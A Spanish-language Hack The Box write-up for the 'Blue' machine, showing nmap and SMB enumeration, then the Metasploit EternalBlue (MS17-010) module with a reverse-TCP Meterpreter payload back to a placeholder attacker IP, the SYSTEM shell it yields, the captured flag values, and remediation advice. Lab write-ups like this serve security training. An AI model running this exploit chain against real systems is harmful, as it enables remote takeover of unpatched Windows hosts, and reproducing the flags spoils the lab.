# INFORME - HACK THE BOX: BLUE

## Resumen de la Máquina

| Campo | Detalle |
|-------|---------|
| **Nombre** | Blue |
| **Dificultad** | Easy |
| **IP** | 10.129.69.141 |
| **SO** | Windows 7 Professional 7601 SP1 |
| **Nombre Equipo** | HARIS-PC |
| **Vulnerabilidad** | MS17-010 (EternalBlue) - CVE-2017-0143 |
| **Severidad** | CRÍTICA (CVSS 8.1) |

---

## FASE 1: RECONOCIMIENTO

### Escaneo de Puertos (Nmap)
```
nmap -sS -sV -sC -O -p- --min-rate=1000 10.129.69.141
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS-SSN | Microsoft Windows netbios-ssn |
| 445/tcp | SMB | Microsoft Windows 7/8/2008 R2 microsoft-ds |
| 49152-49157/tcp | MSRPC | Servicios RPC abiertos |

### Enumeración SMB
```
smbclient -L //10.129.69.141
```

**Shares disponibles:**
- `ADMIN$` - Acceso restringido
- `C$` - Acceso restringido
- `IPC$` - Inter-Process Communication
- `Share` - Share compartido
- `Users` - Directorio de usuarios

---

## FASE 2: ENUMERACIÓN

### Confirmación de Vulnerabilidad MS17-010
```
nmap --script smb-vuln-ms17-010 -p 445 10.129.69.141
```

**Resultado:**
```
Host is likely VULNERABLE to MS17-010!
```

### Metasploit - Verificación
```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.69.141
run
```

**Resultado:** Confirmado vulnerable a EternalBlue

---

## FASE 3: EXPLLOTACIÓN

### Vector de Ataque: MS17-010 (EternalBlue)

**Módulo utilizado:** `exploit/windows/smb/ms17_010_eternalblue`

**Configuración:**
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.69.141
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_ip>
exploit
```

**Resultado:**
```
[*] Started reverse TCP handler on <tu_ip>:4444
[*] 10.129.69.141:445 - Connecting to target for exploitation.
[+] 10.129.69.141:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened
```

**Sesión obtenida:** Meterpreter → SYSTEM (nt authority\system)

### Alternativa - Ejecución de comandos remotos
```
use auxiliary/admin/smb/ms17_010_command
set RHOSTS 10.129.69.141
set COMMAND whoami
run
```

**Resultado:** `nt authority\system`

---

## FASE 4: POST-EXPLITACIÓN

### User Flag
```
meterpreter > cat C:\\Users\\haris\\Desktop\\user.txt
77bdbda51c6367cb4e7a0b2eed33c7e5
```

### Root Flag (SYSTEM)
```
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
25bbc36921ae32a6040f59f8cf7a3af4
```

### Shell completa
```
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
HARIS-PC
```

---

## FLAGS

| Flag | Ubicación | Valor |
|------|-----------|-------|
| **user.txt** | `C:\Users\haris\Desktop\user.txt` | `77bdbda51c6367cb4e7a0b2eed33c7e5` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` | `25bbc36921ae32a6040f59f8cf7a3af4` |

---

## Cadena de Ataque Completa

```
Nmap Scan
  → Puerto 445 (SMB)
    → Enumeración SMB (shares, usuarios)
      → Confirmación MS17-010 (EternalBlue)
        → Metasploit exploit
          → Meterpreter SYSTEM
            → User Flag (haris)
            → Root Flag (Administrator)
```

---

## Lecciones Aprendidas

1. **EternalBlue es devastador**
   - MS17-010 permite ejecución remota de código como SYSTEM
   - Utilizado en el ataque WannaCry de 2017
   - Afecta a Windows 7, Server 2008 y versiones anteriores

2. **SMB es un vector crítico de ataque**
   - Puerto 445 siempre debe ser evaluado
   - Shares accesibles sin autenticación exponen información
   - Windows Signing debe estar habilitado

3. **Sistemas obsoletos son vulnerabilidades extremas**
   - Windows 7 sin parches = compromiso total en minutos
   - Microsoft dejó de soportar Windows 7 en 2020
   - No hay excusa para no actualizar

4. **Remediación crítica:**
   - Aplicar parche MS17-010 inmediatamente
   - Deshabilitar SMBv1 completamente
   - Migrar a Windows 10/11 o Windows Server 2016+
   - Implementar segmentación de red

5. **Impacto real:**
   - WannaCry afectó a 200,000+ computadoras en 150 países
   - Causó pérdidas estimadas de $4 mil millones USD
   - EternalBlue es una herramienta deState-sponsored hacking




---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../apuntes Chema/Bash Comandos Avanzados.md|Bash Comandos Avanzados]] — Hack The Box, Metasploit, Redes
- [[../apuntes Chema/Bash y PowerShell.md|Bash y PowerShell]] — Hack The Box, Metasploit, Redes
- [[../Apuntes/02 - Sistemas Operativos/Linux - Bash Scripting.md|Linux - Bash Scripting]] — Metasploit, Nmap, Redes
- [[../Apuntes/comandos/Nmap.md|Nmap]] — Linux, Redes, Windows
- [[Informe_Nike.md|Informe_Nike]] — Hack The Box, Metasploit, Redes
- [[Informr_legacy.md|Informr_legacy]] — Hack The Box, Metasploit, Redes

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]

> #hack-the-box #linux #metasploit #nmap #redes #windows
